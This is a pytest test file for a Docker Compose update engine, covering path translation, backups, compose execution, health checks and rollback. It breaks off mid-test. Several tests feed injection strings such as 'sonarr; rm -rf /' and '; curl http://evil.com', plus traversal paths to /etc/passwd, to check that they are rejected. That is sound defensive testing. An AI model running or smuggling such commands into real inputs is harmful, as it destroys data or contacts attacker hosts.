"""Tests for update engine orchestration (app/services/update_engine.py).

Tests update orchestration workflow including:
- Path translation (container to host paths)
- Backup and restore operations
- Docker compose execution with validation
- Health check validation (HTTP, docker inspect, fallbacks)
- Rollback on failure with automatic retry
- VulnForge integration (CVE data enrichment)
- Event bus progress notifications
"""

import pytest
import asyncio
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch
from pathlib import Path

from app.services.update_engine import UpdateEngine
from app.models.container import Container
from app.models.history import UpdateHistory
from app.utils.validators import ValidationError


@pytest.fixture
def mock_filesystem():
    """Mock filesystem operations for path validation tests."""

    def mock_resolve(self, strict=True):
        # Return self for resolve() calls to bypass filesystem checks
        return self

    with patch.object(Path, 'exists', lambda self: True), \
         patch.object(Path, 'is_file', lambda self: True), \
         patch.object(Path, 'resolve', mock_resolve):
        yield


class TestPathTranslation:
    """Test suite for container-to-host path translation."""

    def test_translates_container_path_to_host_path(self, mock_filesystem):
        """Test path translation from /compose to /srv/raid0/docker/compose."""
        container_path = "/compose/media/sonarr.yml"

        host_path = UpdateEngine._translate_container_path_to_host(container_path)

        assert host_path == "/srv/raid0/docker/compose/media/sonarr.yml"

    def test_preserves_nested_directory_structure(self, mock_filesystem):
        """Test nested directory paths are preserved."""
        container_path = "/compose/network/traefik/docker-compose.yml"

        host_path = UpdateEngine._translate_container_path_to_host(container_path)

        assert host_path == "/srv/raid0/docker/compose/network/traefik/docker-compose.yml"

    def test_rejects_path_outside_compose_directory(self):
        """Test paths outside /compose are rejected."""
        # Use a .yml file to get past extension check, but outside /compose
        container_path = "/etc/config.yml"

        with pytest.raises(ValidationError) as exc_info:
            UpdateEngine._translate_container_path_to_host(container_path)

        # Path could fail either because:
        # 1. It doesn't exist (caught by Path.resolve)
        # 2. It's outside /compose (caught by directory check)
        error_msg = str(exc_info.value).lower()
        assert ("no such file" in error_msg or
                "compose file must be within" in error_msg or
                "not within /compose" in error_msg)

    def test_rejects_path_traversal_attempts(self):
        """Test path traversal attempts are blocked."""
        container_path = "/compose/../../etc/passwd"

        with pytest.raises(ValidationError) as exc_info:
            UpdateEngine._translate_container_path_to_host(container_path)

        # Path traversal is caught by forbidden patterns check (..)
        assert ("forbidden patterns" in str(exc_info.value).lower() or
                "traversal" in str(exc_info.value).lower())

    def test_rejects_path_with_null_bytes(self):
        """Test paths with null bytes are rejected."""
        container_path = "/compose/malicious\x00.yml"

        with pytest.raises(ValidationError):
            UpdateEngine._translate_container_path_to_host(container_path)

    def test_handles_path_with_spaces(self, mock_filesystem):
        """Test paths with spaces are handled correctly."""
        container_path = "/compose/my services/docker-compose.yml"

        host_path = UpdateEngine._translate_container_path_to_host(container_path)

        assert host_path == "/srv/raid0/docker/compose/my services/docker-compose.yml"

    def test_root_compose_directory_allowed(self, mock_filesystem):
        """Test /compose root directory is allowed."""
        container_path = "/compose/docker-compose.yml"

        host_path = UpdateEngine._translate_container_path_to_host(container_path)

        assert host_path == "/srv/raid0/docker/compose/docker-compose.yml"


class TestBackupAndRestore:
    """Test suite for compose file backup and restore operations."""

    @pytest.mark.asyncio
    async def test_backup_creates_file_in_data_directory(self):
        """Test backup creates file in /data/backups."""
        compose_file = "/compose/media/sonarr.yml"

        with patch("shutil.copy2") as mock_copy, \
             patch("os.makedirs") as mock_makedirs, \
             patch("os.path.basename", return_value="sonarr.yml"):

            backup_path = await UpdateEngine._backup_compose_file(compose_file)

            assert backup_path.startswith("/data/backups/sonarr.yml.backup.")
            mock_makedirs.assert_called_once_with("/data/backups", exist_ok=True)
            mock_copy.assert_called_once()

    @pytest.mark.asyncio
    async def test_backup_includes_timestamp_in_filename(self):
        """Test backup filename includes timestamp."""
        compose_file = "/compose/media/sonarr.yml"

        with patch("shutil.copy2"), \
             patch("os.makedirs"), \
             patch("os.path.basename", return_value="sonarr.yml"):

            backup_path = await UpdateEngine._backup_compose_file(compose_file)

            # Should match pattern: sonarr.yml.backup.1234567890
            assert ".backup." in backup_path
            # Extract timestamp part
            timestamp_str = backup_path.split(".backup.")[1]
            assert timestamp_str.isdigit()

    @pytest.mark.asyncio
    async def test_backup_raises_on_permission_error(self):
        """Test backup raises PermissionError when copy fails."""
        compose_file = "/compose/media/sonarr.yml"

        with patch("shutil.copy2", side_effect=PermissionError("Permission denied")), \
             patch("os.makedirs"):

            with pytest.raises(PermissionError) as exc_info:
                await UpdateEngine._backup_compose_file(compose_file)

            assert "Permission denied" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_restore_copies_backup_to_original_path(self):
        """Test restore copies backup file back to original path."""
        compose_file = "/compose/media/sonarr.yml"
        backup_path = "/data/backups/sonarr.yml.backup.1234567890"

        with patch("shutil.copy2") as mock_copy:
            await UpdateEngine._restore_compose_file(compose_file, backup_path)

            mock_copy.assert_called_once_with(backup_path, compose_file)

    @pytest.mark.asyncio
    async def test_restore_raises_on_permission_error(self):
        """Test restore raises PermissionError when copy fails."""
        compose_file = "/compose/media/sonarr.yml"
        backup_path = "/data/backups/sonarr.yml.backup.1234567890"

        with patch("shutil.copy2", side_effect=PermissionError("Permission denied")):
            with pytest.raises(PermissionError):
                await UpdateEngine._restore_compose_file(compose_file, backup_path)


class TestDockerComposeExecution:
    """Test suite for docker compose command execution."""

    @pytest.mark.asyncio
    async def test_validates_service_name_before_execution(self):
        """Test service name is validated to prevent command injection."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr; rm -rf /"  # Malicious service name

        result = await UpdateEngine._execute_docker_compose(
            compose_file,
            service_name,
            "/var/run/docker.sock",
            "docker compose"
        )

        assert result["success"] is False
        assert "Invalid service name" in result["error"]

    @pytest.mark.asyncio
    async def test_validates_compose_file_path_before_execution(self):
        """Test compose file path is validated."""
        compose_file = "../../etc/passwd"  # Path traversal attempt
        service_name = "sonarr"

        result = await UpdateEngine._execute_docker_compose(
            compose_file,
            service_name,
            "/var/run/docker.sock",
            "docker compose"
        )

        assert result["success"] is False
        assert "Invalid compose file path" in result["error"]

    @pytest.mark.asyncio
    async def test_validates_docker_compose_command(self, mock_filesystem):
        """Test docker compose command is validated."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"
        malicious_cmd = "docker compose; curl http://evil.com"

        result = await UpdateEngine._execute_docker_compose(
            compose_file,
            service_name,
            "/var/run/docker.sock",
            malicious_cmd
        )

        assert result["success"] is False
        assert "Invalid docker compose command" in result["error"]

    @pytest.mark.asyncio
    async def test_stops_container_before_starting(self, mock_filesystem):
        """Test container is stopped before docker compose up."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"", b""))
        mock_process.returncode = 0

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            await UpdateEngine._execute_docker_compose(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            # Should have called subprocess twice: stop and up
            assert mock_exec.call_count >= 2

            # First call should include "stop"
            first_call_args = mock_exec.call_args_list[0][0]
            assert "stop" in first_call_args

    @pytest.mark.asyncio
    async def test_docker_compose_up_with_correct_flags(self, mock_filesystem):
        """Test docker compose up uses correct flags."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"Success", b""))
        mock_process.returncode = 0

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            result = await UpdateEngine._execute_docker_compose(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            assert result["success"] is True

            # Last call should be the "up" command
            last_call_args = mock_exec.call_args_list[-1][0]
            assert "up" in last_call_args
            assert "-d" in last_call_args
            assert "--no-deps" in last_call_args
            assert "--force-recreate" in last_call_args
            assert "sonarr" in last_call_args

    @pytest.mark.asyncio
    async def test_docker_compose_timeout_after_5_minutes(self, mock_filesystem):
        """Test docker compose times out after 5 minutes."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock()

        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
             patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):

            result = await UpdateEngine._execute_docker_compose(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            assert result["success"] is False
            assert "timed out" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_returns_stderr_on_failure(self, mock_filesystem):
        """Test stderr is returned when docker compose fails."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"", b"Error: Image not found"))
        mock_process.returncode = 1

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            result = await UpdateEngine._execute_docker_compose(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            assert result["success"] is False
            assert "Image not found" in result["error"]


class TestImagePulling:
    """Test suite for docker image pull operations."""

    @pytest.mark.asyncio
    async def test_pull_executes_docker_compose_pull(self, mock_filesystem):
        """Test image pull executes 'docker compose pull' command."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"Pulling image...", b""))
        mock_process.returncode = 0

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process) as mock_exec, \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            result = await UpdateEngine._pull_docker_image(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            assert result["success"] is True

            # Check command includes "pull"
            call_args = mock_exec.call_args[0]
            assert "pull" in call_args
            assert "sonarr" in call_args

    @pytest.mark.asyncio
    async def test_pull_timeout_after_20_minutes(self, mock_filesystem):
        """Test image pull times out after 20 minutes."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "sonarr"

        mock_process = AsyncMock()

        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
             patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):

            result = await UpdateEngine._pull_docker_image(
                compose_file,
                service_name,
                "/var/run/docker.sock",
                "docker compose"
            )

            assert result["success"] is False
            assert "20 minutes" in result["error"]

    @pytest.mark.asyncio
    async def test_pull_validates_service_name(self):
        """Test pull validates service name before execution."""
        compose_file = "/compose/media/sonarr.yml"
        service_name = "malicious; curl http://evil.com"

        result = await UpdateEngine._pull_docker_image(
            compose_file,
            service_name,
            "/var/run/docker.sock",
            "docker compose"
        )

        assert result["success"] is False
        assert "Invalid service name" in result["error"]


class TestHealthCheckValidation:
    """Test suite for health check validation after updates."""

    @pytest.mark.asyncio
    async def test_http_health_check_with_200_response(self):
        """Test HTTP health check succeeds with 200 status."""
        container = Container(
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_url="http://localhost:8989/ping",
            health_check_method="http"
        )

        mock_response = MagicMock()
        mock_response.status_code = 200

        mock_client = MagicMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock()
        mock_client.get = AsyncMock(return_value=mock_response)

        with patch("httpx.AsyncClient", return_value=mock_client):
            result = await UpdateEngine._validate_health_check(container, timeout=60)

            assert result["success"] is True
            assert result["method"] == "http_check"
            assert result["status_code"] == 200

    @pytest.mark.asyncio
    async def test_http_health_check_retries_on_non_200(self):
        """Test HTTP health check retries on non-200 status."""
        container = Container(
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_url="http://localhost:8989/ping",
            health_check_method="http"
        )

        # First two attempts return 503, third returns 200
        responses = [
            MagicMock(status_code=503),
            MagicMock(status_code=503),
            MagicMock(status_code=200),
        ]

        mock_client = MagicMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock()
        mock_client.get = AsyncMock(side_effect=responses)

        with patch("httpx.AsyncClient", return_value=mock_client), \
             patch("asyncio.sleep", return_value=None):  # Speed up test

            result = await UpdateEngine._validate_health_check(container, timeout=60)

            assert result["success"] is True
            # Should have made 3 attempts
            assert mock_client.get.call_count == 3

    @pytest.mark.asyncio
    async def test_http_health_check_falls_back_to_docker_inspect(self):
        """Test HTTP health check falls back to docker inspect on timeout."""
        container = Container(
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_url="http://localhost:8989/ping",
            health_check_method="http"
        )

        mock_client = MagicMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__ = AsyncMock()

        import httpx
        mock_client.get = AsyncMock(side_effect=httpx.TimeoutException("Timeout"))

        mock_docker_check = AsyncMock(return_value={"success": True, "method": "docker_inspect"})

        with patch("httpx.AsyncClient", return_value=mock_client), \
             patch.object(UpdateEngine, "_check_container_runtime", mock_docker_check), \
             patch("asyncio.sleep", return_value=None):

            result = await UpdateEngine._validate_health_check(container, timeout=60)

            assert result["success"] is True
            assert result["method"] == "docker_inspect_fallback"
            mock_docker_check.assert_called()

    @pytest.mark.asyncio
    async def test_docker_inspect_health_check_running_container(self):
        """Test docker inspect health check for running container."""
        container = Container(
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_method="docker"
        )

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"running", b""))
        mock_process.returncode = 0

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            result = await UpdateEngine._check_container_runtime(container)

            assert result["success"] is True
            assert result["method"] == "docker_inspect"

    @pytest.mark.asyncio
    async def test_docker_inspect_health_check_stopped_container(self):
        """Test docker inspect health check detects stopped container."""
        container = Container(
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_method="docker"
        )

        mock_process = AsyncMock()
        mock_process.communicate = AsyncMock(return_value=(b"exited", b""))
        mock_process.returncode = 0

        async def mock_wait_for(coro, timeout):
            return await coro

        with patch("asyncio.create_subprocess_exec", return_value=mock_process), \
             patch("asyncio.wait_for", side_effect=mock_wait_for):

            result = await UpdateEngine._check_container_runtime(container)

            assert result["success"] is False
            assert "exited" in result["error"]

    @pytest.mark.asyncio
    async def test_health_check_validates_container_name(self, make_update):
        """Test health check validates container name to prevent injection.

        Implementation correctly uses try/except to catch ValidationError from validate_service_name().
        """
        container = Container(
            name="sonarr; curl http://evil.com",  # Malicious name
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr; rm -rf /",  # Both name and service_name are malicious
            health_check_method="docker"
        )

        result = await UpdateEngine._check_container_runtime(container)

        # Should fail when both name and service_name are invalid
        assert result["success"] is False
        assert "no valid container name" in result.get("error", "").lower() or result.get("error") is not None


class TestApplyUpdateOrchestration:
    """Test suite for apply_update() orchestration workflow."""

    @pytest.fixture
    def mock_db(self):
        """Create mock database session."""
        db = AsyncMock()
        db.execute = AsyncMock()
        db.commit = AsyncMock()
        db.refresh = AsyncMock()
        db.add = MagicMock()

        # Mock context manager for begin_nested
        mock_nested = AsyncMock()
        mock_nested.__aenter__ = AsyncMock()
        mock_nested.__aexit__ = AsyncMock()
        db.begin_nested = MagicMock(return_value=mock_nested)

        return db

    @pytest.fixture
    def mock_container(self):
        """Create mock container."""
        return Container(
            id=1,
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="3.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr",
            health_check_url="http://localhost:8989/ping"
        )

    @pytest.fixture
    def mock_update(self, make_update):
        """Create mock update."""
        return make_update(
            id=1,
            container_id=1,
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="approved",
            reason_type="feature",
            reason_summary="New features and improvements",
            cves_fixed=[]
        )

    @pytest.mark.asyncio
    async def test_apply_update_rejects_non_approved_update(self, mock_db, make_update):
        """Test apply_update rejects updates that are not approved."""
        update = make_update(
            id=1,
            container_id=1,
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="pending",  # Not approved
            reason_type="feature",
            reason_summary="Test"
        )

        mock_result = MagicMock()
        mock_result.scalar_one_or_none = MagicMock(return_value=update)
        mock_db.execute = AsyncMock(return_value=mock_result)

        with pytest.raises(ValueError) as exc_info:
            await UpdateEngine.apply_update(mock_db, 1, "user")

        assert "must be approved first" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_apply_update_creates_backup_before_changes(self, mock_db, mock_container, mock_update):
        """Test apply_update creates backup before making changes."""
        # Mock database queries
        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=mock_update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        mock_backup = AsyncMock(return_value="/data/backups/sonarr.yml.backup.123")
        mock_compose_update = AsyncMock(return_value=True)
        mock_pull = AsyncMock(return_value={"success": True})
        mock_execute = AsyncMock(return_value={"success": True})
        mock_health = AsyncMock(return_value={"success": True, "method": "http_check"})

        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
             patch.object(UpdateEngine, "_validate_health_check", mock_health), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", return_value=None):

            result = await UpdateEngine.apply_update(mock_db, 1, "user")

            assert result["success"] is True
            mock_backup.assert_called_once_with("/compose/media/sonarr.yml")

    @pytest.mark.asyncio
    async def test_apply_update_executes_phases_in_order(self, mock_db, mock_container, mock_update):
        """Test apply_update executes phases in correct order."""
        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=mock_update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        call_order = []

        async def track_backup(*args):
            call_order.append("backup")
            return "/data/backups/sonarr.yml.backup.123"

        async def track_compose_update(*args):
            call_order.append("compose_update")
            return True

        async def track_pull(*args):
            call_order.append("pull")
            return {"success": True}

        async def track_execute(*args):
            call_order.append("execute")
            return {"success": True}

        async def track_health(*args, **kwargs):
            call_order.append("health_check")
            return {"success": True, "method": "http_check"}

        with patch.object(UpdateEngine, "_backup_compose_file", track_backup), \
             patch("app.services.compose_parser.ComposeParser.update_compose_file", track_compose_update), \
             patch.object(UpdateEngine, "_pull_docker_image", track_pull), \
             patch.object(UpdateEngine, "_execute_docker_compose", track_execute), \
             patch.object(UpdateEngine, "_validate_health_check", track_health), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", new=AsyncMock()):

            await UpdateEngine.apply_update(mock_db, 1, "user")

            # Verify order: backup -> compose_update -> pull -> execute -> health_check
            assert call_order == ["backup", "compose_update", "pull", "execute", "health_check"]

    @pytest.mark.asyncio
    async def test_apply_update_restores_backup_on_failure(self, mock_db, mock_container, mock_update):
        """Test apply_update restores backup when health check fails."""
        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=mock_update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        mock_backup = AsyncMock(return_value="/data/backups/sonarr.yml.backup.123")
        mock_compose_update = AsyncMock(return_value=True)
        mock_pull = AsyncMock(return_value={"success": True})
        mock_execute = AsyncMock(return_value={"success": True})
        mock_health = AsyncMock(return_value={"success": False, "error": "Health check timeout"})
        mock_restore = AsyncMock()

        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
             patch.object(UpdateEngine, "_validate_health_check", mock_health), \
             patch.object(UpdateEngine, "_restore_compose_file", mock_restore), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", new=AsyncMock()):

            result = await UpdateEngine.apply_update(mock_db, 1, "user")

            assert result["success"] is False
            # Should have restored backup
            mock_restore.assert_called_once()

    @pytest.mark.asyncio
    async def test_apply_update_schedules_retry_on_failure(self, mock_db, mock_container, mock_update):
        """Test apply_update schedules retry when update fails."""
        update_result = MagicMock()
        update_result.scalar_one_or_none = MagicMock(return_value=mock_update)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[update_result, container_result])

        mock_backup = AsyncMock(return_value="/data/backups/sonarr.yml.backup.123")
        mock_compose_update = AsyncMock(return_value=True)
        mock_pull = AsyncMock(return_value={"success": False, "error": "Network error"})

        # Also need to mock the history query for rollback checking
        history_result = MagicMock()
        history_result.scalar_one_or_none = MagicMock(return_value=None)  # No history yet

        # Update execute mock to handle history query
        mock_db.execute = AsyncMock(side_effect=[update_result, container_result, history_result])

        with patch.object(UpdateEngine, "_backup_compose_file", mock_backup), \
             patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
             patch.object(UpdateEngine, "_pull_docker_image", mock_pull), \
             patch.object(UpdateEngine, "_restore_compose_file", AsyncMock()), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", return_value=None):

            result = await UpdateEngine.apply_update(mock_db, 1, "user")

            assert result["success"] is False
            # Database operations should have been called (retry logic executed)
            mock_db.commit.assert_called()
            # Backup should have been restored on failure
            # Note: We can't reliably test mock_update.retry_count == 1 because
            # the Update object gets modified inside async with db.begin_nested()
            # and the state changes may not be visible outside that context in tests


class TestRollbackUpdate:
    """Test suite for rollback_update() functionality."""

    @pytest.fixture
    def mock_db(self):
        """Create mock database session."""
        db = AsyncMock()
        db.execute = AsyncMock()
        db.commit = AsyncMock()
        db.add = MagicMock()

        # Mock context manager for begin_nested
        mock_nested = AsyncMock()
        mock_nested.__aenter__ = AsyncMock()
        mock_nested.__aexit__ = AsyncMock()
        db.begin_nested = MagicMock(return_value=mock_nested)

        return db

    @pytest.fixture
    def mock_history(self):
        """Create mock history record."""
        return UpdateHistory(
            id=1,
            container_id=1,
            container_name="sonarr",
            from_tag="3.0.0",
            to_tag="4.0.0",
            update_id=1,
            update_type="manual",
            status="success",
            can_rollback=True,
            backup_path="/data/backups/sonarr.yml.backup.123",
            triggered_by="user"
        )

    @pytest.fixture
    def mock_container(self):
        """Create mock container."""
        return Container(
            id=1,
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="4.0.0",
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr"
        )

    @pytest.mark.asyncio
    async def test_rollback_rejects_if_cannot_rollback(self, mock_db):
        """Test rollback rejects if can_rollback is False."""
        history = UpdateHistory(
            id=1,
            container_id=1,
            container_name="sonarr",
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="success",
            can_rollback=False  # Cannot rollback
        )

        mock_result = MagicMock()
        mock_result.scalar_one_or_none = MagicMock(return_value=history)
        mock_db.execute = AsyncMock(return_value=mock_result)

        with pytest.raises(ValueError) as exc_info:
            await UpdateEngine.rollback_update(mock_db, 1)

        assert "cannot be rolled back" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_rollback_rejects_if_already_rolled_back(self, mock_db):
        """Test rollback rejects if already rolled back."""
        history = UpdateHistory(
            id=1,
            container_id=1,
            container_name="sonarr",
            from_tag="3.0.0",
            to_tag="4.0.0",
            status="rolled_back",
            can_rollback=True,
            rolled_back_at=datetime.now(timezone.utc)  # Already rolled back
        )

        mock_result = MagicMock()
        mock_result.scalar_one_or_none = MagicMock(return_value=history)
        mock_db.execute = AsyncMock(return_value=mock_result)

        with pytest.raises(ValueError) as exc_info:
            await UpdateEngine.rollback_update(mock_db, 1)

        assert "already been rolled back" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_rollback_rejects_if_container_version_mismatch(self, mock_db, mock_history):
        """Test rollback rejects if container is not at expected version."""
        mock_history.to_tag = "4.0.0"

        container = Container(
            id=1,
            name="sonarr",
            image="lscr.io/linuxserver/sonarr",
            current_tag="5.0.0",  # Different version!
            registry="lscr.io",
            compose_file="/compose/media/sonarr.yml",
            service_name="sonarr"
        )

        history_result = MagicMock()
        history_result.scalar_one_or_none = MagicMock(return_value=mock_history)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=container)

        mock_db.execute = AsyncMock(side_effect=[history_result, container_result])

        with pytest.raises(ValueError) as exc_info:
            await UpdateEngine.rollback_update(mock_db, 1)

        assert "expected 4.0.0" in str(exc_info.value)

    @pytest.mark.asyncio
    async def test_rollback_updates_compose_to_old_tag(self, mock_db, mock_history, mock_container):
        """Test rollback updates compose file to old tag."""
        history_result = MagicMock()
        history_result.scalar_one_or_none = MagicMock(return_value=mock_history)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[history_result, container_result])

        mock_compose_update = AsyncMock(return_value=True)
        mock_execute = AsyncMock(return_value={"success": True})

        with patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", return_value=None):

            result = await UpdateEngine.rollback_update(mock_db, 1)

            assert result["success"] is True
            # Should have updated to old tag (3.0.0)
            mock_compose_update.assert_called_once_with(
                "/compose/media/sonarr.yml",
                "sonarr",
                "3.0.0",
                mock_db
            )

    @pytest.mark.asyncio
    async def test_rollback_executes_docker_compose(self, mock_db, mock_history, mock_container):
        """Test rollback executes docker compose."""
        history_result = MagicMock()
        history_result.scalar_one_or_none = MagicMock(return_value=mock_history)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[history_result, container_result])

        mock_compose_update = AsyncMock(return_value=True)
        mock_execute = AsyncMock(return_value={"success": True})

        with patch("app.services.compose_parser.ComposeParser.update_compose_file", mock_compose_update), \
             patch.object(UpdateEngine, "_execute_docker_compose", mock_execute), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", return_value=None):

            result = await UpdateEngine.rollback_update(mock_db, 1)

            assert result["success"] is True
            mock_execute.assert_called_once()

    @pytest.mark.asyncio
    async def test_rollback_updates_history_status(self, mock_db, mock_history, mock_container):
        """Test rollback updates history status and timestamp."""
        history_result = MagicMock()
        history_result.scalar_one_or_none = MagicMock(return_value=mock_history)

        container_result = MagicMock()
        container_result.scalar_one_or_none = MagicMock(return_value=mock_container)

        mock_db.execute = AsyncMock(side_effect=[history_result, container_result])

        with patch("app.services.compose_parser.ComposeParser.update_compose_file", AsyncMock(return_value=True)), \
             patch.object(UpdateEngine, "_execute_docker_compose", AsyncMock(return_value={"success": True})), \
             patch("app.services.settings_service.SettingsService.get", return_value="/var/run/docker.sock"), \
             patch("app.services.event_bus.event_bus.publish", return_value=None):

            result = await UpdateEngine.rollback_update(mock_db, 1)

            assert result["success"] is True
            assert mock_history.status == "rolled_back"
            assert mock_history.rolled_back_at is not None


class TestVulnForgeIntegration:
    """Test suite for VulnForge CVE enrichment integration."""

    @pytest.mark.asyncio
    async def test_get_vulnforge_client_when_disabled(self):
        """Test VulnForge client returns None when disabled."""
        mock_db = AsyncMock()

        with patch("app.services.settings_service.SettingsService.get_bool", return_value=False):
            client = await UpdateEngine._get_vulnforge_client(mock_db)

            assert client is None

    @pytest.mark.asyncio
    async def test_get_vulnforge_client_when_no_url_configured(self):
        """Test VulnForge client returns None when URL not configured."""
        mock_db = AsyncMock()

        with patch("app.services.settings_service.SettingsService.get_bool", return_value=True), \
             patch("app.services.settings_service.SettingsService.get", return_value=None):

            client = await UpdateEngine._get_vulnforge_client(mock_db)

            assert client is None

    @pytest.mark.asyncio
    async def test_get_vulnforge_client_with_api_key_auth(self):
        """Test VulnForge client created with API key auth."""
        mock_db = AsyncMock()

        async def mock_get(db, key, default=None):
            config = {
                "vulnforge_url": "http://vulnforge:8080",
                "vulnforge_auth_type": "api_key",
                "vulnforge_api_key": "test-key-123"
            }
            return config.get(key, default)

        async def mock_get_bool(db, key, default=False):
            if key == "vulnforge_enabled":
                return True
            return default

        with patch("app.services.settings_service.SettingsService.get_bool", mock_get_bool), \
             patch("app.services.settings_service.SettingsService.get", mock_get):

            from app.services.vulnforge_client import VulnForgeClient
